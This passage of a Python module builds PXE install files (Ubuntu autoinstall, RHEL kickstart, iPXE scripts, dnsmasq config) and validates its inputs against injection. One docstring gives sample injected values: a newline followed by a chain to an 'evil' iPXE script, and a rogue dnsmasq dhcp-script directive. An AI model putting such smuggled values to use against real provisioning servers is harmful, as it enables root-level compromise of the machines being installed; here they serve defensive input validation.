                    + " --boot-drive=" + disk)
    else:
        body = _rhel_layout_lines(plan["layout"], disk).rstrip("\n").split("\n")
        boot = "bootloader --location=mbr --boot-drive=" + disk

    if not use_pre:
        # 显式盘名：Python 侧直接输出，但要钉死只用这块盘（否则 part /boot/efi 那类
        # 不带 --ondisk 的行可能落到别的盘上）；custom 的行里已经有这行了。
        if custom:
            return body + [boot]
        return ["ignoredisk --only-use=" + disk] + body + [boot]

    if not custom:
        # 规格 §3.1 的片段首行：先钉死目标盘，再 clearpart
        body = ["ignoredisk --only-use=$target"] + body
    lines = ["%pre --interpreter=/bin/bash --log=/tmp/pre-disk.log"]
    lines += _rhel_pick_target_lines(plan)
    # 注意：**不要**按固件分支成 `--location=partition` —— RHEL 8+ 的 GRUB2 不支持，
    # anaconda 会直接："GRUB2 does not support installation to a partition." 然后终止装机
    # （VM141 / OVMF 真机实证）。UEFI 也用 mbr，anaconda 自会把 EFI 引导装进 ESP。
    lines.append("cat > /tmp/disk.ks <<EOF")
    lines += body
    lines.append(boot)
    lines.append("EOF")
    lines.append("%end")
    lines.append("%include /tmp/disk.ks")
    return lines


# ===== Ubuntu autoinstall =====
def _ubuntu_user_data(c):
    dc = c.disk_config or {}
    nc = c.net_config or {}
    # D7 第 3 层：主机名与管理员用户名都会落进 YAML，先做字符白名单。
    # admin_user 的注入面已实测可利用（RHEL ks 的 %post 以 root 执行，含 `;` 即可注入命令；
    # autoinstall 的 YAML 值含换行即可插入 `groups: [sudo]` 之类的新键）——
    # 主防线是 schemas.py 的用户名白名单，这里是 defense-in-depth 兜底。
    hn = _safe_hostname(c.hostname)
    admin = _safe_username(c.admin_user)
    plan = _disk_plan(c, dc)
    if plan is None:
        # ── 既有路径：disk_config 为空/只有历史键 "disk" ──
        # 回归红线 §5.1：输出必须与改造前逐字一致。历史键 disk 唯一的变化是先过一遍
        # _safe_line（只拦控制字符/换行）—— 它会被拼进 ks 的 --drives=<disk>，
        # 从这里注入一整行是既有漏洞；合法盘名（sda/nvme0n1/…）恒等，不受影响。
        disk = dc.get("disk")
        if disk is not None:
            disk = _safe_line(disk, "disk_config.disk")
        scheme = c.disk_scheme
        if scheme not in ("lvm", "direct", "zfs"):
            scheme = "lvm"
        cfg = {"name": scheme}
        if disk is not None:
            cfg["match"] = {"path": "/dev/" + disk}
        storage = json.dumps({"layout": cfg})
    else:
        storage = json.dumps(_ubuntu_storage_obj(plan))

    if c.net_mode == "static":
        iface = nc.get("interface", "ens33")
        addr = nc.get("ip", "10.0.0.10") + "/" + str(nc.get("cidr", 24))
        eth = {iface: {
            "addresses": [addr],
            "routes": [{"to": "default", "via": nc.get("gateway", "10.0.0.1")}],
            "nameservers": {"addresses": nc.get("dns", ["8.8.8.8"])}},
        }
        network = json.dumps({"version": 2, "renderer": "networkd", "ethernets": eth})
    else:
        network = json.dumps({"version": 2, "renderer": "networkd"})

    lines = [
        "#cloud-config",
        "# Ubuntu Server autoinstall - subiquity",
        "autoinstall:",
        "  version: 1",
        "  locale: " + c.locale,
        "  keyboard: {layout: " + c.keyboard + "}",
        "  timezone: " + c.timezone,
        "  identity:",
        "    realname: '" + admin + "'",
        "    username: " + admin,
        "    hostname: " + hn,
        "    password: '" + _hash_pw(c.admin_password) + "'",
        "  storage: " + storage,
        "  network: " + network,
    ]
    if c.ssh_keys:
        lines.append("  ssh:")
        lines.append("    authorized-keys: " + json.dumps(c.ssh_keys))
    if c.mirror:
        lines.append("  apt:")
        lines.append("    primary:")
        lines.append("      - arches: [amd64]")
        lines.append("        uri: " + c.mirror)
    # 配了 authorized-keys 就必须把 openssh-server 装上：只写 ssh_keys 不装包，
    # 等于配了一组永远用不上的钥匙（22.04 live-server 最小安装不含 openssh-server）。
    pkgs = list(c.extra_packages or [])
    if c.ssh_keys and "openssh-server" not in pkgs:
        pkgs.append("openssh-server")
    if pkgs:
        lines.append("  packages: " + json.dumps(pkgs))
    lines.append("  late-commands:")
    if c.post_script:
        shell_quoted = shlex.quote(c.post_script)
        full_cmd = "curtin in-target --target=/target -- bash -c " + shell_quoted
        lines.append("    - " + json.dumps(full_cmd))
    # 这条必须容错。真机实测（22.04 live-server 最小安装）里 ssh 单元根本不存在，
    # 命令返回 1，curtin 于是把**已经装好的系统**判成 install_fail：
    #   串口实证 "Command '[... systemctl enable ssh]' returned non-zero exit status 1"
    #   → subiquity/ErrorReporter/install_fail → 界面停在 "An error occurred"；
    # 而且它后面的 `reboot` 再也执行不到，无人值守装机就卡死在报错界面。
    # 装 ssh 靠上面的 packages，启用失败不该把整台机器的装机判为失败。
    lines.append("    - curtin in-target --target=/target -- systemctl enable ssh || true")
    lines.append("    - reboot")
    return "\n".join(lines) + "\n"


# ===== RHEL Kickstart =====
def _rhel_ks(c):
    dc = c.disk_config or {}
    nc = c.net_config or {}
    disk = dc.get("disk", "sda")
    # %post 以 root 执行，admin_user 必须收敛到安全字符集
    admin = _safe_username(c.admin_user)

    plan = _disk_plan(c, dc)
    if plan is None:
        # ── 既有路径（回归红线 §5.1）：逐字保持不变 ──
        # 历史键 disk 先过 _safe_line：它直接进 --drives=/--ondisk=/--boot-drive=，
        # 含换行即可往 ks 里注入一整行。合法盘名恒等，故输出不变。
        disk = _safe_line(disk, "disk_config.disk") if disk is not None else "sda"
        parts = _rhel_layout_lines(c.disk_scheme, disk)
        disk_lines = [parts.rstrip(), "bootloader --location=mbr --boot-drive=" + disk]
    else:
        # 结构化配置：auto/match 走 %pre + %include（ks 没有自动选盘原语）；
        # 显式 name 直接由 Python 侧输出。两条路径下 clearpart/part/volgroup/logvol/
        # bootloader 只会出现一次，绝不重复声明。
        use_pre = plan["mode"] in ("auto", "match")
        disk_lines = _rhel_disk_block(plan, use_pre)

    if c.net_mode == "static":
        net = ("network --bootproto=static --device=" + nc.get("interface", "ens33") +
               " --ip=" + nc.get("ip", "10.0.0.10") +
               " --netmask=" + nc.get("netmask", "255.255.255.0") +
               " --gateway=" + nc.get("gateway", "10.0.0.1") +
               " --nameserver=" + ",".join(nc.get("dns", ["8.8.8.8"])) +
               " --hostname=" + c.hostname + " --activate")
    else:
        net = "network --bootproto=dhcp --hostname=" + c.hostname + " --activate"

    q = chr(34)
    _mirror = _safe_ident(c.mirror, "mirror", extra=":/?&=%+")
    repo = ("url --url=" + q + _mirror + q + "\n"
            if _mirror else "# url --url=" + q + "http://mirror/rocky/9/BaseOS/x86_64/os/" + q + "\n")
    # 额外仓库（如 AppStream）必须在 **kickstart 里也声明**：inst.addrepo 只作用于安装器
    # 命令行，kickstart 安装期间的包解析用的是 ks 自己的 repo 列表。
    # 实测教训：只给 BaseOS 时，装完 326 个包后死在
    #   SecurityInstallationError: /usr/sbin/authconfig is missing（authconfig 在 AppStream）。
    for _r in (c.extra_repos or []):
        _n = _safe_ident((_r or {}).get("name", ""), "extra_repos[].name")
        _u = _safe_ident((_r or {}).get("url", ""), "extra_repos[].url", extra=":/?&=%+")
        if _n and _u:
            repo += "repo --name=" + q + _n + q + " --baseurl=" + q + _u + q + "\n"

    pkgs = c.extra_packages or ["vim", "net-tools", "bash-completion", "tar", "wget", "curl"]

    L = [
        "# RHEL / Rocky / Alma Linux Kickstart",
        "lang " + c.locale,
        "keyboard --vckeymap=" + c.keyboard,
        "timezone " + c.timezone,
        "",
        repo.rstrip(),
        "",
        net,
        "",
        "auth --enableshadow --passalgo=sha512",
        # 口令回退保持可用：rootpw 优先 root_password、其次 admin_password；两者都空时 _hash_pw 抛 ValueError
        "rootpw --iscrypted " + _hash_pw(c.root_password or c.admin_password),
        # user 行同样两者都空才报错：仅填 root_password 时 admin 口令沿用同一来源，绝不代填默认口令
        # M1：kickstart 的 user --password 默认按【明文】解释。缺 --iscrypted 时，
        # _hash_pw() 产出的 "$6$rounds=5000$..." 这一整串密文会被当成口令本身，
        # 于是管理员账号永远无法用预期口令登录。rootpw 那行本来就有 --iscrypted。
        "user --name=" + admin + " --iscrypted --password=" + _hash_pw(c.admin_password or c.root_password) + " --gecos=" + chr(34) + admin + chr(34) + " --groups=wheel",
        "",
        *disk_lines,
        "selinux --permissive",
        "firewall --enabled --ssh",
        "services --enabled=sshd,NetworkManager",
        "firstboot --disable",
        "eula --agreed",
        "reboot",
        "",
        "%packages --ignoremissing",
    ]
    L.extend(pkgs)
    L.append("%end")
    if c.ssh_keys or c.post_script:
        L.append("")
        L.append("%post --interpreter=/bin/bash")
        for k in c.ssh_keys or []:
            # 原实现用 chr(39)+k+chr(39) 手工拼单引号：key 里含单引号即可逃出引号再注入命令。
            # 改用 shlex.quote（对正常公钥是恒等变换，见 NC1 的恒等性论证）。
            L.append("mkdir -p /home/" + admin + "/.ssh && echo "
                     + shlex.quote(str(k)) + " >> /home/" + admin + "/.ssh/authorized_keys")
        L.append("chown -R " + admin + ":" + admin + " /home/" + admin + "/.ssh")
        if c.post_script:
            L.append(c.post_script)
        L.append("%end")
    return "\n".join(L) + "\n"


def _safe_line(v, field="字段") -> str:
    """第 3 层兜底：值会被原样拼进 iPXE 脚本 / dnsmasq.conf，而两者都以**换行分隔**命令/指令。

    所以值里出现换行或任何控制字符（含 TAB/CR）就等于注入一整行：
      iso_url="http://x/y.iso\\nchain http://evil/p.ipxe" → 裸机装机时执行攻击者脚本
      http_root="http://x\\ndhcp-script=/tmp/evil"        → dnsmasq 指令注入；该 conf 由
        **宿主 root dnsmasq** 加载（compose 把 /etc/dnsmasq.d 挂进容器）→ root 级影响面

    第 2 层（schemas.PxeGenerateIn / PxeProfileIn 的 field_validator）已经拦一次；
    这里再挡一次，保证任何绕过 HTTP 层的调用方（脚本、直接调 generate_all）也注入不进去。
    """
    s = str(v if v is not None else "")
    for ch in s:
        if ord(ch) < 0x20 or ord(ch) == 0x7F:
            raise ValueError(
                field + " 不允许包含换行或控制字符（会造成 iPXE/dnsmasq 配置注入）"
            )
    return s


def _safe_ident(v, field, extra="") -> str:
    """比 _safe_line 更严：只允许 [A-Za-z0-9._-] 以及调用方指定的额外字符。

    这些值会以 `--name="X"` / `inst.addrepo=Name,URL` 的形式进入 kickstart 与内核
    命令行 —— 引号、逗号、空格会改变**语法结构**，不只是控制字符那类问题。
    """
    s = _safe_line(v, field)
    if not s:
        return ""
    ok = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-") | set(extra)
    bad = sorted({ch for ch in s if ch not in ok})
    if bad:
        raise ValueError(field + " 含不允许的字符 " + repr("".join(bad)))
    return s


def _extra_repo_args(repos) -> str:
    """把额外仓库拼成 `inst.addrepo=Name,URL`（逗号是 anaconda 的分隔符，值里不能有）。"""
    out = ""
    for r in repos or []:
        name = _safe_ident((r or {}).get("name", ""), "extra_repos[].name")
        url = _safe_ident((r or {}).get("url", ""), "extra_repos[].url", extra=":/?&=%+")
        if name and url:
            out += " inst.addrepo=" + name + "," + url
    return out


# ===== iPXE 菜单 =====
def _ipxe_menu(c, mac="", answer_url=""):
    # 第 3 层兜底：统一先净化再拼接（见 _safe_line 的说明）
    http_root = _safe_line(c.http_root, "http_root")
    kernel_path = _safe_line(c.kernel_path, "kernel_path")
    initrd_path = _safe_line(c.initrd_path, "initrd_path")
    iso_url = _safe_line(c.iso_url, "iso_url")
    kernel_console = _safe_line(c.kernel_console, "kernel_console")
    mirror = _safe_line(c.mirror, "mirror")

    kernel = http_root + "/" + kernel_path
    initrd = http_root + "/" + initrd_path
    # UEFI 必须在内核命令行上给出 initrd 的名字，且要与 iPXE `initrd` 命令注册的名字一致
    # （即该 URL 的 basename，可用 iPXE 的 imgstat 看到）。**BIOS 下这是 NO-OP**，
    # 所以两种固件统一带上，不需要分支。
    # 实测证据（VM141 / OVMF）：不带它时内核 panic
    #   "VFS: Cannot open root device \"ram0\" or unknown-block(0,0): error -6"
    # 而 iPXE 其实**已经**把 initrd 下载下来了（HTTP 日志里有 GET .../initrd），
    # 只是没交给内核 —— 同一份配置在 SeaBIOS 下完全正常。
    # 出处：iPXE 维护者 Robin Smidsrød 在 ipxe-devel 邮件列表的说明。
    initrd_name = initrd_path.rsplit("/", 1)[-1]
    # D7 第 3 层：主机名/mac 会落进 iPXE 脚本的注释行，先做字符白名单
    hn = _safe_hostname(c.hostname)
    mac_s = _safe_mac(mac) or "auto"
    if (c.os_type or "").strip().lower() == "ubuntu":
        seed = _safe_line(answer_url, "answer_url") or (http_root + "/")
        if not seed.endswith("/"):
            seed += "/"
        # Ubuntu 装机链路的两条**实测定案**（在 PVE 真机跑出来过，证据在内核串口里）：
        #
        # 1) 配置投递用 cloud-config-url，不再用 `ds=nocloud-net;s=<seed>`。
        #    后者依赖 iPXE 把 `;` 传给内核，而 iPXE 不认反斜杠转义：`\;` 会以字面反斜杠
        #    进入内核命令行（串口 dmesg 实证
        #    "Kernel command line: ... ds=nocloud\;s=http://..."），
        #    于是 DataSourceNoCloud.parse_cmdline_data() 里要求精确子串 " ds=nocloud;"
        #    的判定失配 → 数据源退化成 none → 安装器进交互模式，autoinstall 永不生效。
        #    cloud-config-url 是纯 key=value，没有分号、没有转义，跨 iPXE/GRUB/syslinux 都稳。
        #
        # 2) 必须同时给 `url=<可挂载 ISO 的 URL>`，不能用相对位置参数
        #    `--- <squashfs_path>`：后者实测失败
        #    "Unable to find a medium containing a live file system"，
        #    因为 casper 需要一个**可挂载介质**才能建立 live 文件系统。
        #
        # 还有一个必须绕开的坑：cloud-init 自己也会解析 `url=`（cmd/main.py 的
        # parse_cmdline_url(names=("cloud-config-url", "url")) 取第一个命中的键）。
        # 只写 url=<ISO> 时，cloud-init 会把 2GB 的 ISO 当成配置文件流式下载进内存
        # （实测 3.66GB anon RSS → cloud-init 被 OOM 杀，local/network 两个 stage 全 FAILED）。
        # 带上 cloud-config-url 后按顺序先命中它，cloud-init 就不会再碰 url=。
        if not iso_url:
            raise ValueError(
                "Ubuntu 装机必须指定可挂载的安装介质：模板未提供 iso_url，"
                "且 /srv/opstk/iso 中没有与 os_type/os_version 匹配的镜像。"
                "请把对应 ISO 放入 /srv/opstk/iso，或在生成参数里显式传 iso_url。"
            )
        cmdline = ("autoinstall cloud-config-url=" + seed + "user-data "
                   "ip=dhcp url=" + iso_url)
        if kernel_console:
            cmdline += " " + kernel_console
        L = ["#!ipxe", "# boot: " + hn + " (MAC " + mac_s + ")",
             "kernel " + kernel + " root=/dev/ram0 initrd=" + initrd_name + " " + cmdline,
             "initrd " + initrd, "boot"]
    else:
        # D17：RHEL 装机必须有可用的安装源。本机**从不**发布 ISO 仓库树
        # （extract_from_iso() 只拷 vmlinuz/initrd.img，那个目录里没有 repomd.xml，
        # 不是合法的 anaconda 仓库），所以旧的 "c.mirror or http_root + '/os'"
        # 只会产出一个 404 的 inst.repo，装机必然失败。
        # 这里显式失败：api/pxe.py 的 _gen_pxe_files() 已把 ValueError 映射成 422 + 中文提示。
        if not mirror:
            raise ValueError(
                "RHEL 系装机必须提供可用的安装源 mirror：本机未发布 ISO 仓库树，"
                "无法为 inst.repo 提供内容。请填写模板的 mirror，或先自行发布安装源。"
            )
        answer = _safe_line(answer_url, "answer_url") or (http_root + "/ks.cfg")
        stage2 = _safe_line(c.stage2, "stage2")
        args = ("kernel " + kernel + " initrd=" + initrd_name + " inst.ks=" + answer)
        if stage2:
            args += " inst.stage2=" + stage2
        args += " inst.repo=" + mirror
        if c.extra_repos:
            args += _extra_repo_args(c.extra_repos)
        args += " ip=dhcp" + (" " + kernel_console if kernel_console else "")
        L = ["#!ipxe", "# boot: " + hn + " (MAC " + mac_s + ")", args,
             "initrd " + initrd, "boot"]
    return "\n".join(L) + "\n"


# ===== dnsmasq 配置 =====
def _dnsmasq(c, installs=None):
    """三种部署模式：
    standalone - 独立 DHCP（专用装机网络，裸机接入即装）
    proxy      - ProxyDHCP（与现有 DHCP 并存，只提供 PXE 引导信息，不分配 IP）
    relay      - 中继模式（本机只做 TFTP/HTTP 文件服务；引导文件名由外部 DHCP 提供）

    两阶段引导（D21）的设计要点：dnsmasq man page 对 `--dhcp-boot` **只规定 tag 必须匹配，
    未规定多条同时匹配时哪条胜出**。因此这里用 `tag-if` 造【两两互斥】的 tag，
    让每条 `dhcp-boot` 只带一个 tag，完全不依赖优先级语义。
    （该结构已用 netns 隔离的 dnsmasq + 自造 DHCP 包实测 7 个场景验证，见 RUNBOOK-D21-verified.md。）
    """
    installs = installs or []
    nc = c.net_config or {}
    iface = nc.get("interface", "eth0")
    gateway = nc.get("gateway", "192.168.1.1")
    mode = c.deploy_mode or "standalone"

    L = [
        "# dnsmasq PXE 配置 (OpsToolkit 生成)",
        "# 部署模式: " + _mode_label(mode),
        "port=0",
        "bind-interfaces",
        "",
    ]
    if iface:
        L.insert(3, "interface=" + iface)  # 在 port=0 后插入接口绑定

    # D7 第 3 层：只接受合法 MAC，非法直接跳过（防注入进 dhcp-host 与文件名）
    reg = []
    for inst in installs:
        mac = _safe_mac(inst.get("mac"))
        if not mac:
            continue
        reg.append((mac, _mac_tag(mac)))

    if mode == "relay":
        # M6：原实现同时写了 interface=<iface> 与 no-dhcp-interface=<iface>。
        # `--no-dhcp-interface` 的语义是"在该接口上不提供 DHCP、**TFTP** 与 RA"，
        # 两条叠加后此接口上什么都不服务（连 enable-tftp 也失效），且没有 dhcp-range 时
        # dhcp-match/dhcp-boot 永远不会被下发 —— 是彻底的死配置。
        # 而 relay 也无法改成 proxy 语义：proxy 的 dhcp-range=<本机IP>,proxy 要靠该地址
        # 反推【客户端所在子网】，本应用只有 server_ip、没有客户端子网输入，
        # 无法为中继过来的异地子网构造正确的 proxy range。
        # 所以 relay 的正确语义是：本机只供文件，引导文件名由外部 DHCP 提供。
        L.append("# 中继模式：本机只提供 TFTP/HTTP 文件；DHCP 与引导文件名由外部负责")
        L.append("# 外部 DHCP 需要下发：")
        L.append("#   option 66 (tftp-server-name) = " + (c.server_ip or "本机IP"))
        L.append("#   option 67 (bootfile-name)    = undionly.kpxe   (传统 BIOS)")
        L.append("#                                = ipxe.efi        (x86_64 UEFI, arch 7/9)")
        L.append("#                                = ipxe-i386.efi   (32 位 UEFI, arch 6)")
        L.append("# 若希望由本机自行下发两阶段引导信息，请改用 proxy 模式，")
        L.append("# 并确保交换机 IP Helper 指向本机。")
        L.append("#")
        L.append("# 注意：中继模式下本机不是 DHCP 服务器，所以本工具生成的【每台机器定制菜单】")
        L.append("# （boot/<mac>.ipxe，里面才是各自的 hostname 与应答文件路径）不会被自动下发。")
        L.append("# 需要按 MAC 定制时，让外部 DHCP 直接把 option 67 下发成该机器的 URL")
        L.append("# （iPXE 客户端支持 URL，MAC 用短横线形式）：")
        L.append("#   option 67 = " + c.http_root + "/boot/<mac>.ipxe   例如 " + c.http_root
                 + "/boot/" + (_mac_tag(reg[0][0]) if reg else "aa-bb-cc-dd-ee-ff") + ".ipxe")
        L.append("# 否则机器只会被带到通用 boot.ipxe，按 MAC 定制的 hostname 不会生效。")
        L.append("")
        L.append("enable-tftp")
        L.append("tftp-root=/srv/tftp")
        L.append("")
        return "\n".join(L) + "\n"

    if mode == "proxy":
        # ProxyDHCP：不分配 IP，只提供 PXE 引导信息，与现有 DHCP 并存
        pxeserver = c.server_ip or "192.168.1.100"
        L.append("# ProxyDHCP 模式: 不分配 IP，仅提供 PXE 引导，与现有 DHCP 服务器并存")
        L.append("# pxeserver 必须是本机对外 IP")
        L.append("dhcp-range=" + pxeserver + ",proxy")
        L.append("dhcp-option=option:server-ip-address," + pxeserver)
    else:
        # standalone：独立 DHCP + TFTP，完整分配 IP
        L.append("# 独立 DHCP 模式: 完整分配 IP + PXE 引导（确保网段内无其他 DHCP）")
        L.append("dhcp-range=" + nc.get("dhcp_start", "192.168.1.100") + ","
                 + nc.get("dhcp_end", "192.168.1.200") + ",12h")
        L.append("dhcp-option=option:router," + gateway)
        L.append("dhcp-option=option:dns-server," + nc.get("dns_server", gateway))

    L.append("")
    L.append("enable-tftp")
    L.append("tftp-root=/srv/tftp")
    L.append("")
    L.append("# 客户端分类：option 93 = 客户端架构；option 175 = iPXE 自报")
    L.append("# arch 7/9 = x86_64 UEFI，arch 6 = 32 位 UEFI，无 arch = 传统 BIOS")
    L.append("dhcp-match=set:efi-x86_64,option:client-arch,7")
    L.append("dhcp-match=set:efi-x86_64,option:client-arch,9")
    L.append("dhcp-match=set:efi-ia32,option:client-arch,6")
    L.append("dhcp-match=set:ipxe,175")
    for mac, tag in reg:
        L.append("dhcp-host=" + mac + ",set:pxe_" + tag)
    L.append("")
    L.append("# 用 tag-if 造两两互斥的 tag：每条 dhcp-boot 只带一个 tag，不依赖优先级")
    L.append("tag-if=set:fw-x64,tag:!ipxe,tag:efi-x86_64")
    L.append("tag-if=set:fw-ia32,tag:!ipxe,tag:efi-ia32")
    L.append("tag-if=set:fw-bios,tag:!ipxe,tag:!efi-x86_64,tag:!efi-ia32")
    L.append("tag-if=set:fw-menu,tag:ipxe")
    L.append("")
    L.append("# 第一阶段：PXE 固件取 iPXE 二进制，按架构区分")
    if mode == "proxy":
        # D5 的真实缺陷是：proxy 分支用了 tag:efi-x86_64 / tag:!efi-x86_64，
        # 却**从未设置** efi-x86_64 这个 tag（standalone/relay 分支才有 dhcp-match），
        # 于是 tag:!efi-x86_64 恒真 —— UEFI 机器永远拿到 undionly.kpxe（BIOS 二进制）。
        # 注意：proxy 模式下引导信息必须靠 pxe-service 传递（这是 dnsmasq 的 PXE 代理机制，
        # man page 在 dhcp-range 的 proxy 模式里就指向 --pxe-service）。
        # 实测：把 pxe-service 换成 dhcp-boot 会让 proxy 完全不下发引导信息，故保留 pxe-service。
        L.append("# ProxyDHCP 用 pxe-service 下发（PXE 代理机制；纯 dhcp-boot 在 proxy 下不下发）")
        L.append('pxe-service=tag:fw-x64,X86-64_EFI,"PXE Boot",ipxe.efi')
        L.append('pxe-service=tag:fw-ia32,IA32_EFI,"PXE Boot",ipxe-i386.efi')
        L.append('pxe-service=tag:fw-bios,x86PC,"PXE Boot",undionly.kpxe')
    else:
        L.append("# 独立 DHCP 用 dhcp-boot 下发（TFTP 文件名）")
        L.append("dhcp-boot=tag:fw-x64,ipxe.efi")
        L.append("dhcp-boot=tag:fw-ia32,ipxe-i386.efi")
        L.append("dhcp-boot=tag:fw-bios,undionly.kpxe")
    L.append("")
    L.append("# 第二阶段：iPXE 自己再次 DHCP 时下发【脚本 URL】（HTTP），而不是固件")
    L.append("# 按 MAC 指定 iPXE 菜单 (tag 方式, 避免 URL 被当作 hostname)")
    for mac, tag in reg:
        L.append("tag-if=set:fw-menu-" + tag + ",tag:fw-menu,tag:pxe_" + tag)
        L.append("dhcp-boot=tag:fw-menu-" + tag + "," + c.http_root + "/boot/" + tag + ".ipxe")
    # 默认菜单对**所有**已登记 MAC 取反，从而与上面每台机的专属菜单互斥
    neg = "".join(",tag:!pxe_" + t for _, t in reg)
    L.append("tag-if=set:fw-menu-def,tag:fw-menu" + neg)
    L.append("dhcp-boot=tag:fw-menu-def," + c.http_root + "/boot.ipxe")
    L.append("")
    return "\n".join(L) + "\n"


def _mode_label(mode):
    return {
        "standalone": "standalone - 独立 DHCP (专用装机网络)",
        "proxy": "proxy - ProxyDHCP (与现有 DHCP 并存)",
        "relay": "relay - 中继模式 (仅 TFTP, 依赖交换机中继)",
    }.get(mode, mode)





def _readme(c):
    iso_mb = int(c.iso_size_mb or 0)
    ram_mb = (iso_mb + 1536) if iso_mb else 0
    return (
        "OpsToolkit PXE 部署说明\n"
        "========================\n\n"
        "目标系统: " + c.os_type + " " + c.os_version + "\n"
        "PXE 服务端: " + c.server_ip + "\n"
        "本次使用的 ISO: " + (c.iso_url or "(未指定)") + "\n\n"
        "安装介质（必读）\n"
        "----------------\n"
        "Ubuntu 用 casper 的 url= 直接挂载 ISO，不需要手工解包 squashfs。\n"
        "把 ISO 放到服务端 /srv/opstk/iso/（应用发布在 http://<server>:8000/pxe/iso/）。\n"
        "旧的相对位置写法 `--- .../installer.squashfs` 会以\n"
        "  \"Unable to find a medium containing a live file system\" 失败。\n\n"
        "内存要求（必读）\n"
        "----------------\n"
        "casper 走 HTTP 取介质时，会把**整份 ISO 读进内存**（/cdrom 是 tmpfs），\n"
        "所以目标机内存要 >= ISO 大小 + 约 1.5 GB（装机环境本身的开销）。\n"
        "  本 ISO 大小: " + (str(iso_mb) + " MB  ->  建议目标机内存 >= " + str(ram_mb) + " MB"
                            if iso_mb else "(未知，请按 ISO 大小 + 1.5GB 估算)") + "\n"
        "这是 casper 的固有行为，不是本工具的写法问题：官方至今（LP #1660206，2017 年至今 New）\n"
        "仍不支持只经 HTTP 取 squashfs；想不占内存只能用 NFS 做介质，但 NFS 对防火墙不友好。\n"
        "注意：`url=` 这个内核参数 cloud-init 也会解析（cloud-config-url 的弃用别名），\n"
        "所以必须同时给出 cloud-config-url=，否则 cloud-init 会把整份 ISO 也当配置下载一遍\n"
        "（实测：3.66GB anon RSS 被 OOM 杀）。本配置已经带上了。\n\n"
        "引导顺序（必读）\n"
        "----------------\n"
        "目标机固件请设为【先硬盘、后网卡】，例如 PVE：\n"
        "  qm set <vmid> --boot \"order=scsi0;net0\"\n"
        "  - 空盘机器：硬盘引导失败 → 落到网卡 → PXE 装机\n"
        "  - 装好的机器：硬盘有 grub → 直接起系统，不会被 PXE 重装\n"
        "若设成只从网卡引导，装完自动重启后会再次 PXE 并**重装一遍**（反复抹盘）。\n\n"
        "内核控制台\n"
        "----------\n"
        "本次参数: " + (c.kernel_console or "(未设置)") + "\n"
        "无显示器的机器请接串口(115200)看装机过程与失败原因。\n\n"
        "部署步骤\n"
        "--------\n"
        "1. dnsmasq.conf 放到 /etc/dnsmasq.conf；\n"
        "   iPXE 固件(ipxe.efi/undionly.kpxe)放入 /srv/tftp/；systemctl restart dnsmasq\n"
        "   注意：Ubuntu 的 ipxe 包**不含 32 位 EFI 固件**（只有 ipxe.efi / snponly.efi /\n"
        "   undionly.kpxe / ipxe.pxe / ipxe.lkrn），而 dnsmasq 里为 32 位 UEFI(arch 6)\n"
        "   引用了 ipxe-i386.efi。若确有 32 位 UEFI 机器，需自行编译该固件放到 /srv/tftp/；\n"
        "   64 位 UEFI(arch 7/9) 与传统 BIOS 不受影响（已实测）。\n"
        "2. ISO 放入 /srv/opstk/iso/（不要解包）\n"
        "3. user-data(Ubuntu)/ks.cfg(RHEL) 与 boot.ipxe 放到 HTTP 目录，路径与 http_root 一致\n"
        "4. 目标机固件设为\"先硬盘、后网卡\"，然后开机\n"
        "注意: 已有 DHCP 时在交换机配置 IP Helper 指向本机\n"
    )


# 进入 _validate_lines() 时的豁免名单：
#   post_script —— 本来就是多行脚本，要整段塞进 late-command / %post；
#   admin_user  —— 它在每个汇点都已经过 _safe_username() 白名单**剔除**（不是拒绝），
#                  这是既定契约（见 tests 里对该行为的断言），再改判成"拒绝"会与之冲突。
# 其余标量字段都会被原样拼进 iPXE 脚本、dnsmasq.conf、autoinstall YAML 或 kickstart，
# 一律必须是单行 —— 见 _safe_line。
_LINE_GUARD_EXEMPT = frozenset({"post_script", "admin_user"})


def _validate_lines(c):
    """第 3 层统一兜底：把所有会被拼进生成物的标量字段逐个体检一遍。

    放在 generate_all() 入口而不是各个拼接点，是为了不漏汇点：
    http_root/kernel_path/initrd_path/iso_url/kernel_console 进 iPXE 与 dnsmasq，
    mirror 进 autoinstall 的 apt.uri 与 kickstart 的 `url --url="..."`，
    timezone/locale/keyboard 进 YAML —— 任何一处漏检，一个换行就能注入一整行。
    """
    from dataclasses import fields as _dc_fields
    for f in _dc_fields(c):
        if f.name in _LINE_GUARD_EXEMPT:
            continue
        val = getattr(c, f.name)
        if isinstance(val, str):
            _safe_line(val, f.name)


def generate_all(c, installs=None):
    _validate_lines(c)
    files = {}
    if (c.os_type or "").strip().lower() == "ubuntu":
        files["user-data"] = _ubuntu_user_data(c)
        files["meta-data"] = "local-hostname: " + _safe_hostname(c.hostname) + "\n"
    else:
        files["ks.cfg"] = _rhel_ks(c)
    files["boot.ipxe"] = _ipxe_menu(c)
    files["dnsmasq.conf"] = _dnsmasq(c, installs)
    files["README.txt"] = _readme(c)
    # 每台装机记录生成独立菜单与应答文件，使 hostname 生效
    for inst in installs or []:
        # D7 第 3 层：mac 会变成【文件名】与 dhcp-host 的值，必须是合法 MAC
        mac = _safe_mac(inst.get("mac"))
        if not mac:
            continue
        tag = _mac_tag(mac)
        hostname = _safe_hostname(inst.get("hostname"), "") or _safe_hostname(c.hostname)
        ic = replace(c, hostname=hostname)
        if (c.os_type or "").strip().lower() == "ubuntu":
            seed = c.http_root + "/user-data/" + tag + "/"
            files["user-data/" + tag + "/user-data"] = _ubuntu_user_data(ic)
            files["user-data/" + tag + "/meta-data"] = "local-hostname: " + hostname + "\n"
            answer = seed
        else:
            answer = c.http_root + "/ks/" + tag + "/ks.cfg"
            files["ks/" + tag + "/ks.cfg"] = _rhel_ks(ic)
        files["boot/" + tag + ".ipxe"] = _ipxe_menu(ic, mac=mac, answer_url=answer)
    return files
